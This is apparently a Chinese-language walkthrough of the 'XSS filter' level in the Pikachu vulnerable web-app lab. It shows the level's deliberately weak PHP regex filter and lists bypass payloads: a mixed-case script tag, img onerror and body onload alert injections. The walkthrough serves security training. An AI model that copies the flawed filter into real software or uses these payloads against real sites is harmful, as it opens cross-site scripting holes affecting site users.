# xss之过滤

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "xss_01.php"){
    $ACTIVE = array('','','','','','','','active open','','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');

}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR.'header.php';

$html = '';
if(isset($_GET['submit']) && $_GET['message'] != null){
    //这里会使用正则对<script进行替换为空,也就是过滤掉
    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
//    $message=str_ireplace('<script>',$_GET['message']);

    if($message == 'yes'){
        $html.="<p>那就去人民广场一个人坐一会儿吧!</p>";
    }else{
        $html.="<p>别说这些'{$message}'的话,不要怕,就是干!</p>";
    }

}


?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="xss.php">xss</a>
                </li>
                <li class="active">xss之过滤</li>
            </ul><!-- /.breadcrumb -->

            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="有些内容被过滤了,试试看怎么绕过?">
                点一下提示~
            </a>

        </div>
        <div class="page-content">

            <div id="xssr_main">
                <p class="xssr_title">阁下,请问你觉得人生苦短吗?</p>
                <form method="get">
                    <input class="xssr_in" type="text" name="message" />
                    <input class="xssr_submit" type="submit" name="submit" value="submit" />
                </form>
                <?php echo $html;?>
            </div>


        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR.'footer.php';

?>
```

通过观察代码可以看到是过滤了<script的标签

```
$message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
```

***

# 二、通关教程

绕过方法有很多，如大小写绕过，payload如下

```
# 大小写绕过
<sCrIPT>AleRt('XsS')</sCrIPt>

# 使用其他的Payload
<img src="" onerror=alert('xss')>
<body onload=alert('XSS')>
```

![image-20230304132300247](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\XSS（跨站脚本）\images\image-20230304132300247.png)

